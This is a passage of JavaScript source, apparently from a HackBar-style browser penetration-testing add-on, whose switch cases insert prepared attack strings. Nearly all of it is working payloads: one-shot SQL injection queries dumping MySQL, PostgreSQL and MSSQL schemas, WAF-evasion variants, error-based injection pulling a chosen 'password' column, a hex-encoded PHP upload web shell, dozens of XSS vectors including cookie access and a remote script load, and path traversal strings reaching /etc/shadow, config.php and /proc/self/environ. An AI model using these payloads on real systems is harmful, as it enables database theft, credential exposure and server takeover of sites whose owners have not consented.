able_name%29,concat%28%28@col_nr:=0x00%29,0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD%28@tbl_nr:=@tbl_nr%2b1,3,0x0b%29,0x202e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a202848656c6c657227732044696f7329207e20205b,%28Select+count%28column_name%29from%28information_Schema.columns%29where%28table_name=@tbl%29%29,0x5d202f203c666f6e7420636f6c6f723d79656c6c6f773e205265636f726473203a2048454c4c455227732044494f537e205b,%28Select+ifnull%28table_rows,0x30%29+from+information_schema.tables+where+table_name=@tbl%29,0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e%29,0x00%29,concat%280x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD%28@col_nr:=@col_nr%2b1,3,0x0b%29,0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e%29%29%29%29%29x%29,0x3c2f6469763e%29";
					break;
			case 'shell':
						txt = "0x3c3f706870206563686f202755706c6f616465723c62723e273b6563686f20273c62723e273b6563686f20273c666f726d20616374696f6e3d2222206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d6461746122206e616d653d2275706c6f61646572222069643d2275706c6f61646572223e273b6563686f20273c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223530223e3c696e707574206e616d653d225f75706c2220747970653d227375626d6974222069643d225f75706c222076616c75653d2255706c6f6164223e3c2f666f726d3e273b69662820245f504f53545b275f75706c275d203d3d202255706c6f6164222029207b69662840636f707928245f46494c45535b2766696c65275d5b27746d705f6e616d65275d2c20245f46494c45535b2766696c65275d5b276e616d65275d2929207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d656c7365207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d7d3f3e";
					break;
			case '25':
					var dbName = prompt("Database Name","database()");
                    var dbNameFinal = "0x";
                    if(dbName == "database()"){dbNameFinal="database()";}
                    else{
                        // Convert DB name to hexa
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)";
					break;
			case '26':  txt = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
					break;
			case '27':
						txt = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
					break;
			case '28':
						txt = "(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*) from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))";
					break;
			case '29':
						txt = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)";
					break;
			case 'warlock':
						txt = "concat(0x3c63656e7465723e3c666f6e742073697a653d2238223e3c666f6e7420636f6c6f723d22626c61636b223e496e6a6563746572207734726c30636b3c2f666f6e743e3c2f666f6e743e3c2f63656e7465723e,@@datadir,0x3C62723E3C666F6E7420636F6C6F723D626C75653E7C557365727C207E3E203C2F666F6E743E,0x3c617564696f206175746f706c61793e3c736f75726365207372633d22687474703a2f2f6c712e646a2d70756e6a61622e696e666f2f736f6e67732f34382f32363238342f536f756c6a617325323053746f727925323028526161674a6174742e636f6d292e6d7033223e3c2f617564696f3e,user(),0x3C62723E3C666F6E7420636F6C6F723D677265656E3E7C56657273696F6E7C207E3E203C2F666F6E743E,version(),0x3C62723E3C666F6E7420636F6C6F723D707572706C653E7C44427C207E3E3E203C2F666F6E743E,database(),0x3C62723E3C666F6E7420636F6C6F723D233842303030303E7C506F72747C207E3E3E203C2F666F6E743E,@@port,0x3C62723E3C666F6E7420636F6C6F723D233737383839393E7C546D704469727C207E3E3E203C2F666F6E743E,@@tmpdir,0x3C62723E3C666F6E7420636F6C6F723D234443313433433E7C43757272656E745F557365727C207E3E3E203C2F666F6E743E,current_user(),0x3C62723E3C666F6E7420636F6C6F723D234646443730303E7C53797374656D5F557365727C207E3E3E203C2F666F6E743E,system_user(),0x3C62723E3C666F6E7420636F6C6F723D233546394541443E7C53657373696F6E5F557365727C207E3E3E203C2F666F6E743E,session_user(),0x3C62723E3C666F6E7420636F6C6F723D6C696D653E7C536368656D617C207E3E3E203C2F666F6E743E,schema(),0x3c62723e,0x3c666f6e7420636f6c6f723d626c75653e,0x7c486f7374204e616d657c207e203e3e,@@HOSTNAME,0x3c62723e,0x3c666f6e7420636f6c6f723d7265643e,0x7c53796d6c696e6b7c207e203e3e,@@HAVE_SYMLINK,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,0x7c426974732044657461696c737c207e203e3e,@@VERSION_COMPILE_MACHINE,0x3c62723e%20,0x3c666f6e7420666163653d636f75726965723e,0x7c46696c652053797374656d7c207e203e3e,@@CHARACTER_SET_FILESYSTEM,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)%20)";
					break;	
			case 'dhanu-waf':
						txt = "/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070616c61203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))";
					break;	
            case 'dhanu':
						txt = "concat(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070346c613a3a4772656574277320546f20416c6c204861636b6572277320203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d353e44622056657273696f6e203a,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e506f7274203a,@@PORT,0x3c62723e436865636b2069662053796d6c696e6b206973204f4e203a,@@HAVE_SYMLINK,0x3c62723e536572766572204f73204465746563746564203a,@@VERSION_COMPILE_OS,0x3c62723e436865636b207768696368204f70657261746f72732063616e20626520757365204572726f723a,@@FT_BOOLEAN_SYNTAX,0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))";
					break;	
			case 'raz':
						txt = "unhex(hex(/*!50000concat*/(0x3c62723e3c666f6e7420636f6c6f723d22726564222073697a653d2237223e7e7e52405a7e7e3c2f666f6e743e3c62723e56657273696f6e7e,/*!50000version*/(),0x7e20,@@version_comment,0x3c62723e557365727e,/*!50000user*/(),0x3c62723e5072696d6172792044617461626173657e,/*!database*/(),0x3c62723e3c666f6e7420636f6c6f723d22677265656e223e4e6f204f66204461746162617365737e,(/*!50000select*/ count(/*!50000schema_name*/) from /*!50000information_schema*/.SCHEMATA),0x3c62723e4e6f204f66205461626c65737e,(/*!50000select*/ count(*) from /*!50000information_schema*/.tables where table_schema=/*!database*/()),(/*!50000select*/(@x)from(/*!50000select*/(@x:=0x00),(@xz:=0),(@xx:=0x00),(/*!50000select*/(0)from(/*!50000information_schema*/.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=/*!50000concat*/(@x,0x3c62723e,if((@xx!=table_name),/*!50000concat*/(0x3c2f6469763e,LPAD(@xz:=@xz%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,0x7c7c,/*!50000table_schema*/,0x7c7c3c2f666f6e743e3c666f6e7420636f6c6f723d2279656c6c6f77223e,@xx:=/*!50000table_name*/,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,/*!50000column_name*/,0x3c2f666f6e743e))))x))))";
					break;		
				/*PostgreSQL DIOS*/
			case '30':
						txt = "(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
					break;
			case '31':
						txt = "(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
					break;
			case '32':
						txt = "(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))";
					break;
			   /*MSSQL DIOS*/
			case '33':
						txt = ";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--";
					break;
			/*XSS Payoads by r0ot*/
			case '34':
						txt = "<script>alert(1);</script>";
					break;
			case '35':
						txt = "<script>alert('XSS');</script>";
					break;
			case '36':
						txt = "<IMG SRC=javascript:alert(&quot;XSS&quot;)>";
					break;
			case '37':
						txt = "<IMG SRC=javascript:alert('XSS')>";
					break;
			case '38':
						txt = "<scr<script>ipt>alert('XSS');</scr</script>ipt>";
					break;
			case '39':
						txt = "'><script>alert(0)</script>";
					break;
			case '40':
						txt = "<img src=foo.png onerror=alert(/xssed/) />";
					break;
			case '41':
						txt = "<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>";
					break;
			case '42':
						txt = "<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>";
					break;
			case '43':
						txt = "<marquee><script>alert('XSS')</script></marquee>";
					break;
			case '44':
						txt = "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">";
					break;
			case '45':
						txt = "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">";
					break;
			case '46':
						txt = "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">";
					break;
			case '47':
						txt = "<script src=http://yoursite.com/your_files.js></script>";
					break;
			case '48':
						txt = "</title><script>alert(/xss/)</script>";
					break;
			case '49':
						txt = "</textarea><script>alert(/xss/)</script>";
					break;
			case '50':
						txt = "<IMG LOWSRC=\"javascript:alert('XSS')\">";
					break;
			case '51':
						txt = "<IMG DYNSRC=\"javascript:alert('XSS')\">";
					break;
			case '52':
						txt = "<font style='color:expression(alert(document.cookie))'>";
					break;
			case '53':
						txt = "<img src=javascript:alert('XSS')>";
					break;
			case '54':
						txt = "<script language=JavaScript>alert('XSS')</script>";
					break;
			case '55':
						txt = "<body onunload=javascript:alert('XSS');>";
					break;
			case '56':
						txt = "<body onLoad='alert('XSS');'";
					break;
			case '57':
						txt = "[color=red' onmouseover='alert('xss')']mouse over[/color]";
					break;
			case '58':
						txt = "'/></a></><img src=1.gif onerror=alert(1)>";
					break;
			case '59':
						txt = "window.alert('Bonjour !');";
					break;
			case '60':
						txt = "<div style='x:expression((window.r==1)?'':eval('r=1;";
					break;
			case '61':
						txt = "<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>";
					break;
			case '62':
						txt = "'>><marquee><h1>XSS</h1></marquee>";
					break;
			case '63':
						txt = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">";
					break;
			case '64':
						txt = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">";
					break;
			case '65':
						txt = "<script>var var = 1; alert(var)</script>";
					break;
			case '66':
						txt = "<STYLE type='text/css'>BODY{background:url('javascript:alert('XSS')')}</STYLE>";
					break;
			case '67':
						txt = "<?='<SCRIPT>alert('XSS')</SCRIPT>'?>";
					break;
			case '68':
						txt = "<IMG SRC='vbscript:msgbox(\"XSS\")'>";
					break;
			case '69':
						txt = "' onfocus=alert(document.domain) '> <'";
					break;
			case '70':
						txt = "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>";
					break;
			case '71':
						txt = "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS";
					break;
			case '72':
						txt = "[color=red width=expression(alert(123))][color]";
					break;
			case '73':
						txt = "<BASE HREF='javascript:alert('XSS');//'>";
					break;
			case '74':
						txt = "<br size=\"&{alert('XSS')}\">";
					break;
			case '75':
						txt = "<scrscriptipt>alert(1)</scrscriptipt>";
					break;
			case '76':
						txt = "</br style=a:expression(alert())>";
					break;
			case '77':
						txt = "</script><script>alert(1)</script>";
					break;
			case '78':
						txt = "'><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert('XSS')>";
					break;
			case '79':
						txt = "Execute(MsgBox(chr(88)&chr(83)&chr(83)))<";
					break;
			case '80':
						txt = "<body onLoad='while(true) alert('XSS');'>";
					break;
			case '81':
						txt = "''></title><script>alert(1111)</script>";
					break;
			case '82':
						txt = "</textarea>''><script>alert(document.cookie)</script>";
					break;
			case '83':
						txt = "data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=";
					break;
			case '84':
						txt = "/etc/passwd";
					break;
			case '85':
						txt = "///etc/passwd";
					break;
			case '86':
						txt = "../../../../../../../../../../../../etc/passwd";
					break;
			case '87':
						txt = "/etc/passwd%00";
					break;
			case '88':
						txt = "../../../../../../../../../../../../etc/passwd%00";
					break;
			case '89':
						txt = "\\\etc\passwd";
					break;
			case '90':
						txt = "..\..\..\..\..\..\..\..\..\..\etc\passwd";
					break;
			case '91':
						txt = "\etc\passwd%00";
					break;
			case '92':
						txt = "..\..\..\..\..\..\..\..\..\..\etc\passwd%00";
					break;
			case '93':
						txt = "//etc/passwd";
					break;
			case '94':
						txt = "....//....//....//....//....//....//....//....//....//....//etc/passwd";
					break;
			case '95':
						txt = "//etc/passwd%00";
					break;
			case '96':
						txt = "....//....//....//....//....//....//....//....//....//....//etc/passwd%00";
					break;
			case '97':
						txt = "///etc/hosts";
					break;
			case '98':
						txt = "../../../../../../../../../../../../etc/hosts";
					break;
			case '99':
						txt = "/etc/hosts%00";
					break;
			case '100':
						txt = "../../../../../../../../../../../../etc/hosts%00";
					break;
			case '101':
						txt = "///etc/shadow";
					break;
			case '102':
						txt = "../../../../../../../../../../../../etc/shadow";
					break;
			case '103':
						txt = "/etc/shadow%00";
					break;
			case '104':
						txt = "../../../../../../../../../../../../etc/shadow%00";
					break;
			case '105':
						txt = "..\%20\..\%20\..\%20\../etc/passwd%00";
					break;
			case '106':
						txt = "....//....//....//....//....//....//....//....//....//....//etc/hosts";
					break;
			case '107':
						txt = "....//....//....//....//....//....//....//....//....//....//etc/hosts%00";
					break;
			case '108':
						txt = "\etc\group%00";
					break;
			case '109':
						txt = "..\..\..\..\..\..\..\..\..\..\etc\group%00";
					break;
			case '110':
						txt = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00";
					break;
			case '111':
						txt = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group%00";
					break;
			case '112':
						txt = "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00";
					break;
			case '113':
						txt = "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd%00";
					break;
			case '114':
						txt = "/../../../../../../../../../../etc/passwd^^%00";
					break;
			case '115':
						txt = "/../../../../../../../../../../etc/shadow^^%00";
					break;
			case '116':
						txt = "../\../\../\../\../\../\../\etc/\passwd%00";
					break;
			case '117':
						txt = "/./././././././././././etc/passwd%00";
					break;
			case '118':
						txt = "/./././././././././././etc/shadow%00";
					break;
			case '119':
						txt = "/./././././././././././etc/group%00";
					break;
			case '120':
						txt = "\.\.\.\.\.\.\.\.\etc\passwd%00";
					break;
			case '121':
						txt = "/%00//%00//%00//%00//%00/etc/passwd%00";
					break;
			case '122':
						txt = "/%00//%00//%00//%00//%00/etc/passwd%00";
					break;
			case '123':
						txt = "/%00//%00//%00//%00//%00//etc//shadow%00";
					break;
			case '124':
						txt = "/%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../etc/passwd%00";
					break;
			case '125':
						txt = "..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd%00";
					break;
			case '126':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd%00";
					break;
			case '127':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c../etc/passwd%00";
					break;
			case '128':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cgroup%00";
					break;
			case '129':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cshadow%00";
					break;
			case '130':
						txt = "..//..//..//..//..//config.php%00";
					break;
			case '131':
						txt = "..\/..\/..\/..\/config.php%00";
					break;
			case '132':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c..%5config.php%00";
					break;
			case '133':
						txt = "..%25%35%63..%25%35%63..%25%35%63config.php%00";
					break;
			case '134':
						txt = "///proc/self/environ";
					break;
			case '135':
						txt = "../../../proc/self/environ";
					break;
			case '136':
						txt = "/proc/self/environ%00";
					break;
			case '137':
						txt = "../../../proc/self/environ%00";
					break;
			case '138':
						txt = "../../../../../../../../../../../../proc/self/environ";
					break;
			case '139':
						txt = "../../../../../../../../../../../../proc/self/environ%00";
					break;
		} 		
		hackBar.setSelectedText( txt ); 
	  },
	  /* SYS VARIABLES */
      SysVariables: function (choice)	{
		var str = choice;
		switch (str){
			// VERSION
			case '1': txt = "@@VERSION";
					break;
			case '2': txt = "VERSION()";
					break;
			case '3': txt = "@@GLOBAL.VERSION";
					break;			
			// USER
			case '5': txt = "USER()";
					break;
			case '6': txt = "CURRENT_USER()";
					break;
			case '7': txt = "SYSTEM_USER()";
					break;
			case '8': txt = "SESSION_USER()";
					break;
			case '9': txt = "SUBSTRING_INDEX(USER(),0x40,1)";
					break;
			case '10': txt = "(SELECT+CONCAT(USER)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
					break;					
			// DATABASE
			case '11': txt = "DATABASE()";
					break;
			case '12': txt = "SCHEMA()";
					break;
			case '12.1': txt = "(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
					break;
		    // OTHER MySQL
			case '13': txt = "@@HOSTNAME";
					break;
			case '14': txt = "@@VERSION_COMPILE_MACHINE";
					break;
			case '15': txt = "@@VERSION_COMPILE_OS";
					break;
			case '16': txt = "@@BASEDIR";
					break;
			case '17': txt = "@@DATADIR";
					break;
			case '18': txt = "@@HAVE_OPENSSL";
					break;
			case '19': txt = "@@WAIT_TIMEOUT";
					break;
			case '20': txt = "@@MYISAM_RECOVER_OPTIONS";
					break;
			case '21': txt = "@@HAVE_INNODB";
					break;
			case '22': txt = "@@HAVE_SYMLINK";
					break;
			case '23': txt = "@@CHARACTER_SET_CONNECTION";
					break;
			case '24': txt = "@@CHARACTER_SET_CLIENT";
					break;
			case '25': txt = "@@CHARACTER_SET_FILESYSTEM";
					break;
			case '26': txt = "@@FT_BOOLEAN_SYNTAX";
					break;
			// INFO
			case '27': txt = "(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)";
					break;
			case '28': txt = "(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)";
					break;
			case '29': txt = "(SELECT+CONCAT(info)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
					break;					
			case '30': txt = "@@CHARACTER_SET_SERVER";
					break;
			case '31': txt = "@@CHARACTER_SET_DATABASE";
					break;
			case '32': txt = "@@CHARACTER_SETS_DIR";
					break;
			case '33': txt = "@@COLLATION_CONNECTION";
					break;
			case '34': txt = "@@CONNECT_TIMEOUT";
					break;
			case '35': txt = "@@LANGUAGE";
					break;
			case '36': txt = "@@LOG_ERROR";
					break;	
			case '37': txt = "IF((@@LOWER_CASE_FILE_SYSTEM)=0,0x594553,0x4e4f)";
					break;
			case '38': txt = "IF((@@LOWER_CASE_TABLE_NAMES)=0,0x594553,0x4e4f)";
					break;
			case '39': txt = "@@PID_FILE";
					break;
			case '40': txt = "@@PLUGIN_DIR";
					break;
			case '41': txt = "@@PORT";
					break;
			case '42': txt = "@@SOCKET";
					break;
			case '43': txt = "@@SLAVE_LOAD_TMPDIR";
					break;
			case '44': txt = "@@VERSION_COMMENT";
					break;					
		}	
		hackBar.setSelectedText( txt ); 
	  },
	  /* T.PRO CONVERSATION FUNCTIONS */
      statementsCalcTpro: function (choice)	{
		var txt = hackBar.getSelectedText();
		var str = choice;
		switch (str){		
			case '1':  txt = "";			
					break;
			case '2': txt = "unhex(hex(" + txt + "))";
					break;
			case '3': txt = "cast(" + txt + ")";			
					break;
			case '4': txt = "uncompress(compress(" + txt + "))";			
					break;
            default:
                    txt = "ERROR";
                    break;					
		} 		
		hackBar.setSelectedText( txt ); 
	  },
      /* T.PRO COMMENT FUNCTION */
      commentsTpro: function (choice)	{
		var txt = hackBar.getSelectedText();				
		var str = choice;
		switch (str){
			case '1': txt = txt.replace(/\/\*\*\//g, "+");
				txt = txt.replace(/\/\*\&a\=\*\//g, "+");			
				txt = txt.replace(/ /g, "+");
					break;
			case '2': txt = txt.replace(/\+/g, "/**/");
				txt = txt.replace(/\/\*\&a\=\*\//g, "/**/");
				txt = txt.replace(/ /g, "/**/");
					break;
			case '3': txt = txt.replace(/\+/g, " ");
				txt = txt.replace(/\/\*\*\//g, " ");
				txt = txt.replace(/ /g, " ");
					break;
		} 		
		hackBar.setSelectedText( txt ); 
	},	
	/* ERROR BASED FUNCTION */
      ErrorBased: function (choice)	{						
		var str = choice;
		switch (str){         
			case '1': txt = "+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1";
					break;       
			case '2': txt = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
					break;         
            case '3': 
					var dbName = prompt("Database Name", "DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{        
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + dbNameFinal + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                    break;          
            case '4':
					var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{             
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tableName = prompt("Table Name", "users");                
                    var tblNameHexed = '';
                    for(var i=0;i<tableName.length;i++) {
                        tblNameHexed += ''+tableName.charCodeAt(i).toString(16);
                    }
					txt = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x" + tblNameHexed + "+AND+table_schema=" + dbNameFinal + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";                    
                    break;
			case '5':
					var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;					
					}
                    var columnName = prompt("Column Name", "password");
                    txt = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(" + columnName + ")+AS+CHAR),0x7e))+FROM+" + dbANDtable + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                    break;
			/*MOD's By r0ot@H3X49 Advance Error based*/
			/*Error Based for MySQL Version < 5.5 */
			case '6':
					txt = "+POLYGON((select*from(select*from(select+concat(@@version)f)x))";
					break;
